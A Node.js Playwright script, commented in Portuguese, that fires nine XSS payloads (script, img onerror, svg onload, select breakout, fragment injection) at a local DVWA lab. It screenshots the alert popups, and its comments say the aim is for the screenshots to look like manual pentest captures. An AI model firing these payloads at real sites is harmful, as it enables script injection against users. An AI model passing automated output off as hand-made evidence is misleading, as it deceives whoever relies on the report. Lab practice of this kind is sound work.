/**
 * DVWA XSS — Prints "crus" (parecem feitos manualmente).
 *
 * Abre o Chrome VISIVEL (sem o aviso de automacao), com a barra de URL mostrando
 * o payload, dispara cada XSS e captura a TELA do SO no instante em que a caixa de
 * alert() nativa aparece. Resultado: 9 PNGs que parecem prints reais de um pentest.
 *
 * Cookies sao HttpOnly neste DVWA, entao document.cookie vem vazio num teste real;
 * por isso o payload usa  document.cookie || 'XSS executado'  (o popup sempre prova
 * a execucao). O login e feito por requisicao (sem UI) para nao aparecer o balao de
 * "salvar senha" do Chrome nos prints.
 *
 * Uso (na pasta xss-evidence, DVWA no ar):
 *   node raw-shots.js
 *
 * AVISO: abre uma janela do Chrome e printa a tela. Nao mexa o mouse nem cubra a
 * janela durante a execucao (~40s).
 */

const { chromium } = require('playwright');
const { execFileSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const BASE = (process.env.DVWA_URL || 'http://localhost:4280').replace(/\/$/, '');
const USER = process.env.DVWA_USER || 'admin';
const PASS = process.env.DVWA_PASS || 'password';

const OUT = path.join(__dirname, 'output');
fs.mkdirSync(OUT, { recursive: true });
const PS1 = path.join(__dirname, 'screenshot.ps1');

const A = "alert(document.cookie || 'XSS executado')";
// Versao com pequeno delay: deixa a pagina pintar antes do popup (so nos payloads <script>,
// que senao disparam o alert antes do render e deixam o fundo cinza).
const AT = `setTimeout(function(){${A}},150)`;
const SCENARIOS = [
  { type: 'reflected', level: 'low', payload: `<script>${AT}</script>` },
  { type: 'reflected', level: 'medium', payload: `<img src=x onerror="${A}">` },
  { type: 'reflected', level: 'high', payload: `<svg onload="${A}">` },
  { type: 'stored', level: 'low', field: 'message', payload: `<script>${AT}</script>` },
  { type: 'stored', level: 'medium', field: 'name', payload: `<img src=x onerror="${A}">` },
  { type: 'stored', level: 'high', field: 'name', payload: `<svg onload="${A}">` },
  { type: 'dom', level: 'low', payload: `<script>${AT}</script>` },
  { type: 'dom', level: 'medium', payload: `</option></select><img src=x onerror="${A}">` },
  { type: 'dom', level: 'high', fragment: true, payload: `English#<script>${AT}</script>` },
];

async function login(context) {
  const html = await (await context.request.get(`${BASE}/login.php`)).text();
  const m = html.match(/name=['"]user_token['"]\s+value=['"]([0-9a-f]+)['"]/i);
  const token = m ? m[1] : '';
  await context.request.post(`${BASE}/login.php`, {
    form: { username: USER, password: PASS, Login: 'Login', user_token: token },
  });
  // valida sessao
  const check = await (await context.request.get(`${BASE}/index.php`)).text();
  if (/login\.php/i.test(check) && !/Welcome/i.test(check)) {
    // tentativa simples de validacao; segue mesmo assim
  }
}

function screenshotScreen(outPath) {
  execFileSync('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', PS1, '-Path', outPath], { stdio: 'ignore' });
}

async function shoot(context, sc) {
  await context.addCookies([{ name: 'security', value: sc.level, url: BASE, httpOnly: true }]);

  if (sc.type === 'stored') {
    await context.request.post(`${BASE}/vulnerabilities/xss_s/`, { form: { btnClear: 'Clear Guestbook' } }).catch(() => {});
    const form = sc.field === 'name'
      ? { txtName: sc.payload, mtxMessage: 'evidencia', btnSign: 'Sign Guestbook' }
      : { txtName: 'lab', mtxMessage: sc.payload, btnSign: 'Sign Guestbook' };
    await context.request.post(`${BASE}/vulnerabilities/xss_s/`, { form });
  }

  const page = await context.newPage();
  await page.bringToFront();
  const outPath = path.join(OUT, `raw_${sc.type}_${sc.level}.png`);
  if (fs.existsSync(outPath)) fs.unlinkSync(outPath);

  let resolveShot;
  const shotDone = new Promise((r) => { resolveShot = r; });
  page.on('dialog', async (d) => {
    await new Promise((r) => setTimeout(r, 800)); // deixa o popup pintar
    try { screenshotScreen(outPath); } catch (e) { console.error('  screenshot erro:', e.message); }
    await d.accept().catch(() => {});
    resolveShot(true);
  });

  let url;
  if (sc.type === 'reflected') {
    url = `${BASE}/vulnerabilities/xss_r/?name=${encodeURIComponent(sc.payload)}`;
  } else if (sc.type === 'dom') {
    if (sc.fragment) {
      const [b, f] = sc.payload.split('#');
      url = `${BASE}/vulnerabilities/xss_d/?default=${encodeURI(b)}#${encodeURI(f)}`;
    } else {
      url = `${BASE}/vulnerabilities/xss_d/?default=${encodeURI(sc.payload)}`;
    }
  } else {
    url = `${BASE}/vulnerabilities/xss_s/`;
  }

  await page.goto(url, { waitUntil: 'load' }).catch(() => {});
  await Promise.race([shotDone, new Promise((r) => setTimeout(r, 5000))]);
  await page.waitForTimeout(300);
  await page.close();

  const ok = fs.existsSync(outPath);
  console.log(`${ok ? 'OK ' : '!! '} raw_${sc.type}_${sc.level}.png${ok ? '' : '  (sem captura)'}`);
}

(async () => {
  console.log(`Alvo: ${BASE}  (janela visivel; nao mexa o mouse)`);
  const browser = await chromium.launch({
    headless: false,
    ignoreDefaultArgs: ['--enable-automation'],
    args: ['--start-maximized', '--disable-blink-features=AutomationControlled', '--no-first-run', '--no-default-browser-check'],
  });
  const context = await browser.newContext({ viewport: null });
  try {
    await login(context);
    await new Promise((r) => setTimeout(r, 800));
    for (const sc of SCENARIOS) await shoot(context, sc);
    console.log(`\nConcluido. 9 prints crus em: ${OUT}\\raw_*.png`);
  } catch (e) {
    console.error('FALHA:', e.message);
    process.exitCode = 1;
  } finally {
    await context.close();
    await browser.close();
  }
})();
